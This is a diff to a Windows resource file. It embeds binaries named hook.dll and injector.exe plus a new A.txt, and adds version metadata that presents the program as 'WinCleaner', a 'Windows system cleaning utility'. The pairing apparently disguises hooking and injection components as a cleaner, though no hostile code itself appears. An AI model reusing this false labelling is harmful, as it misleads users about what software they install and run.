@@ -58,6 +58,8 @@ IDR_BINARY3             BINARY                  "D:\\hook.dll"
 
 IDR_BINARY4             BINARY                  "D:\\injector.exe"
 
+IDR_BINARY5             BINARY                  "D:\\A.txt"
+
 
 /////////////////////////////////////////////////////////////////////////////
 //
@@ -73,6 +75,45 @@ IDR_JPG1                JPG                     "D:\\e9b4c65fb45f70ad1b573f67e48
 //
 
 IDR_WAVE1               WAVE                    "D:\\static.wav"
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 6,6,6,6
+ PRODUCTVERSION 6,6,6,6
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x40004L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName", "TODO: <Company name>"
+            VALUE "FileDescription", " Windows system cleaning utility"
+            VALUE "FileVersion", "6.6.6.6"
+            VALUE "InternalName", "WinCleaner.exe"
+            VALUE "LegalCopyright", "Copyright (C) 2021"
+            VALUE "OriginalFilename", "WinCleaner.exe"
+            VALUE "ProductName", "WinCleaner"
+            VALUE "ProductVersion", "6.6.6.6"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
 
 #endif    // English (United States) resources
 /////////////////////////////////////////////////////////////////////////////
